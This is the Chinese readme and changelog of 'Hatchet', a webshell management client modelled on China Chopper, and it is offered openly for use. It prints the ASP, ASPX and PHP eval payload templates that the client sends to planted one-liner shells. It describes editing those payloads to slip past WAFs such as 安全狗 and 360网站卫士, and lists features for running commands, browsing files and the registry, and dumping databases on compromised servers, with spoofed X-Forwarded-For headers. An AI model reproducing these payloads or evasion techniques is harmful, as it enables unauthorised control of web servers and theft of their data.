Hatchet VS2005完整源码

免责申明：
	请使用者注意使用环境并遵守国家相关法律法规！
	由于使用不当造成的后果本厂家不承担任何责任！
------------------------------------------------------------
1. 说明：
	我是一个产刀的，用于什么用途，由您自行选择。

2. 致谢：
	菜刀某前辈及各位网友的建议

3. 弱点：
	存在细节方面没处理好
	数据库与菜刀有所区别不能共用

4. 优点：
	持续更新
	快捷键操作
	注册表读取
	HTTP头自行控制
	POST部分数据可自定义，突破安全狗等WAF(一句话需自行处理)
	PHP Warning 警告去除，避免某些WAF等记录
	PHP支持多种执行命令，安全模式也能执行
	PHP管理PostgreSQL、ODBC_MSSQL、PDO_MYSQL、PDO_MSSQL数据库
	HTTP代理，只完成PHP。支持HTTP[S] GET POST
	文件夹双击进入，树形框的上一层可以点击
	支持NTLM验证
	COMBO历史记录
	支持选择数据库后直接执行SQL命令
	数据库右键获取20条记录
	支持JSP上传
	文件[夹]剪切(文件移动机制秒移)
	文件[夹]多选删除
	文件[夹]多选下载
	应该来说不会崩溃
	右键导出数据库查询结果保存TXT，默认每一个字段用一个【TAB】分开，如果需要用其他字符请在填写保存文件名的时候，后面加上&&，紧跟分隔符。如: table.txt&&@_@
	数据库执行SQL查询时，直接导出到本地文件，不显示到列表框。SQL命令后面加上--file:紧跟要导出到的文件名。如: Select * From Members Limit 0,20--file:1.txt
	支持PHP脚本的数据库管理，远程备份。如: Select * From Members Limit 0,20--save:data.sql--split:@_@

5. 后门：
	缩小体积已加UPX壳
	绝无有意添加的后门，但三流的业余技能不排除被远程溢出的BUG
	文件: C:\Projects\Hatchet\release\Hatchet.exe
	大小: 269312 字节
	文件版本: 1.0.0.1
	修改时间: 2014年8月26日, 12:19:43
	MD5: 91FAA43F3F89083F2E9C78D05E13673C
	SHA1: A1B598CB4EB47554E6F191A7EB33111F462C77FD
	CRC32: C094BD42

/*
	[Header]
	User-Agent=Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
	Referer=1
	X-Forwarded-For=1
	[/Header]
	[Headers]
	Accept-Language: en-us
	Content-Type: application/x-www-form-urlencoded
	[/Headers]
	[POST]
	ASP_POST_DATA==Execute("Execute(""On+Error+Resume+Next:Response.Clear:

	ASPX_POST_DATA==Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(%nPageCode%).GetString(System.Convert.FromBase64String("%szBase64EvalCode%")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.Write("|<-");Response.End();

	PHP_POST_DATA==@eval(base64_decode($_POST[z0]));&z0=

	PHP_POST_Z0_DATA=@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
	[/POST]

	##################################################
	#以下是说明
	请严格保持该格式，大小写不一样
	Referer 为1 则程序自动添加
	X-Forwarded-For 为1 则程序自动随机生成添加
	如果要自己手动添加其固定值，请设为0，后在[Headers]里添加即可。
	[POST]里为POST的部分数据，可自行变异这段代码，过安全狗等，很灵活的哦～
	%nPageCode% 为程序需要处理的编码，请保留
	%szBase64EvalCode% 为程序需要处理的执行代码，请保留
*/

------------------------------------------------------------
2013.12.03
*	本地数据库单引号
*	CMD选择所有，任意键覆盖
+	FileSave CTRL+A

2013.12.07
*	JSP 传递没有 UrlEnCode
+	增加文件夹下载
*	站点管理，光标URL全选
*	szMyBase64Encode.Replace("+","%2B");

2013.12.09
+	增加 HTTP 错误显示
*	修正下载目录，win linux / \
*	修正'\0'格式化发生的截断

2013.12.10
+	TAB标签OK
*	ASPX脚本编码

2013.12.11
*	TAB的X范围加大
+	PHP脚本过安全狗

2013.12.12
*	eval preg_replace均可以使用过狗版本	chr(45).
+	稍微完善一下状态栏

2013.12.13
*	下载、上传文件开启一个新线程

2013.12.18
+	asp	\r\nOn+Error	过狗
+	aspx	var err\r\n	过狗
*	Shell类型编辑时，内容一样不更新
*	文件管理重命名、更改时间，内容一样不更新
+	快捷键 F2 文件管理重命名

2013.12.19
+	增加自写代码
+	增加HTTP头 INI里配置(在主界面右键里，如果文件不存在，第一次自动生成)

2013.12.21
*	修正文件内容Linux(\n)换行显示
+	文件内容 Ctrl+F 查找
*	修正多线程，随机IP都一样
*	PHP Warning 警告去除
+	自写代码快捷键 Ctrl+A，F5执行

2013.12.23
+	增加右键数据库查询结果导出TXT，默认每一个字段用一个【TAB】分开，如果需要用其他字符请在填写保存文件名的时候，后面加上&&，紧跟分隔符。如: table.txt&&,
+	增加数据库执行SQL查询时，直接导出到本地文件，不显示到列表框。SQL命令后面加上--file:紧跟要导出到的文件名。如: Select * From Members Limit 0,20--file:1.txt
*	数据库查询结果显示，计算错误的小Bug
*	数据库错误显示的问题

2013.12.24
*	UTF8 GBK互换的BUG

2013.12.27
+	增加连接数据库代码实例
+	增加命令执行方式(system,passthru,shell_exec,exec,WScript.shell)

2013.12.29
+	增加PHP管理PostgreSQL数据库
*	PHP MySQL少写z1=

2014.01.04
+	增加PHP管理ODBC_MSSQL数据库

2014.01.07
*	数据库导出HTML编码设置charset=GBK
*	JSP查询数据库错误不弹AfxMessageBox

2014.01.08
+	Shell列表排序
*	Shell日期的月份日期添加前导零
*	修正上传文件大小限制

2014.01.09
*	修正CMD，cls清空后上下箭头还原旧内容

2014.01.10
+	显示下载进度大小
*	选择保存文件夹可删除|OFN_NOCHANGEDIR
+	文件下载完成，自动打开文件夹选定文件。

2014.01.14 感谢luoye
*	文件管理路径处理问题。防止调皮的伙伴C:\\\\\\\\\\\\或C://////////或C:
*	JSP db2连接例子有误password=123456;后面有分号。

2014.01.24
+	增加标题栏右键系统菜单
+	记忆选择标签，文件管理，文件内容管理，内容关闭，回到文件管理
*	路途再远，也要回家。小伙伴们春节快乐！！！

2014.02.11
*	运行软件，如果存在INI，自动加载。之前需要右键才会加载。OnMainUpdateIni(bool bNoCreat=true);
+	过360网站卫士
+	POST前一小段数据可在INI里自定义，经研究可突破安全狗等WAF。
	"=Execute(\"Execute(\"\"On+Error+Resume+Next: ==> Ini_szASP_POST_DATA + "
	"=%40eval%09%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0= ==> Ini_szPHP_POST_DATA + "

2014.02.21
+	数据库和文件管理树形框就地编辑，只是方便复制内容，不会改变服务器。
*	修正获取列表框的小问题。GetNextItem < 0 return;
+	增加文件复制,文件剪切(仅PHP)

2014.02.22
+	增加文件剪切(ASP ASPX JSP)

2014.03.05
*	修正PreTranslateMessage事件处理忘记及时返回
*	修正文件管理，后续增加的映射磁盘网络磁盘等，显示会有问题。

2014.03.17
*	某种原因，更改软件名称: Hatchet
+	增加POST的z0前部分自定义，突破安全宝的Base64关键词。
*	修正CMD框，等宽字体，对齐的问题。

2014.03.18
*	修正CMD返回路径的截取问题
*	修正代码执行，等宽字体，对齐的问题。
*	修正获取文件内容，等宽字体，对齐的问题。
+	增加部分多线程，不卡界面。
+	增加代码执行导出导入。

2014.04.01
*	界面大改动(非常感谢p1n9y_fly)
+	增加大部分多线程
+	增加部分快捷键

2014.04.02
*	再次修正随机IP都一样
-	取消自动添加Cookie，导致INI里填的Cookie不能被添加上 INTERNET_FLAG_NO_COOKIES
+	增加快捷键 Ctrl+V
+	增加系统托盘
*	文件内容保存线程变量未初始化(感谢Xi总)
*	修正重命名、新建目录，如果文件[夹]存在，覆盖。(感谢Xi总)

2014.04.04
+	增加上传文件后自动刷新列表
*	修正PHP文件[夹]可读可写标注。换成is_readable is_writable(感谢敌敌喂)
*	修正树形框，判断给定树项是否包含子项,2014.04.04 BUG，有子项，不一定已经存在(感谢敌敌喂)
*	修正文件管理C:\/\/\/\/这种路径
*	修正CMD Ctrl+V
+	增加Shell列表快捷键 Insert(添加) Delete(删除) Enter(编辑)
+	增加文件管理列表快捷键，回车进入文件夹或者文件内容编辑。

2014.04.07
*	增强多文件处理
*	修正文件管理树形框小问题
*	更换文件管理EDIT->COMBO
+	增加注册表管理

2014.04.14
+	增加注册表本地缓存
+	稍微完善一下状态栏
*	修正asp数据库截取的BUG(感谢Ciph2r)
*	修正编辑的对话框显示位置问题
+	增加COMBO记录

2014.05.07
+	增加显示版本
*	修正CMD	cls保留系统信息
+	增加CMD	Please wait...
+	增加数据库右键查询20条
+	增加数据库ESC取消编辑
*	修正文件图标szIcoTemp变量忘记初始化
+	文件管理，回车或双击的文件如果是以下弹出下载
		.jpg.gif.png.bmp.jpeg.ico
		.zip.rar.tgz.7z.tar.gz.iso.cab.bz2.jar.dmg
		.exe.msi.dll.sys.avi.mpeg.mpg.vob.rmvb.wmv.mp3.mp4.3gp.ogg.voc
		.swf.pdf.flv.fla.psd.doc.docx.xls.xlsx.ppt.pptx.mdb.rtf

2014.05.09
+	主页增加复制URL地址(Ctrl+C)
*	文件夹双击进入,树形框跟进(感谢Lee Swagger)
*	文件夹双击进入,树形框选择项并没有改变。SelectItem执行失败，换OnNMClickTree判断
+	增加ASPX POST数据INI自定义
*	MYSQL如有不正常的表名，中文、空格等，请用`包含表名(感谢Hancock)

2014.05.21
+	增加全部EDIT，CTRL+A
*	修正MAIN IDC_EDIT_FIND，大小改变，被覆盖隐藏
+	增加Wget线程
*	修正数据库显示结果，编码问题导致的死循环
*	修正asp特殊环境缓存的问题。Response.Clear
*	修正asp数据库SI变量初始化
+	优化数据库返回的列表宽度

2014.06.06
+	增加浏览器功能，以便支持NTLM验证(感谢R)
*	修正CMD如果所在光标位置可更改粘贴(感谢R)
+	增加CMD，ESC按键，清除当前输入的命令
+	增加浏览器状态和加载完成后的地址显示

2014.07.02
*	修正如果标签已关闭，线程还在运行。导致的程序崩溃。if (pDlg->m_hWnd == NULL)
+	增加PDO管理mysql和mssql数据库


2014.07.07
*	修正PHP执行cmd变量未初始化$ret=1（函数禁用导致的出错）
*	修正CMD显示的小问题
*	切换标签，当前Dialog获得焦点
+	支持PHP脚本的数据库管理，远程备份

2014.08.26
*	文件上传分块缩小，51200
+	添加一些状态
*	Data select show
*	CMD命令排序
+	Data Ctrl+C和F2快捷键
*	修正ComboBox下拉高度
+	添加Shell判断是否存在
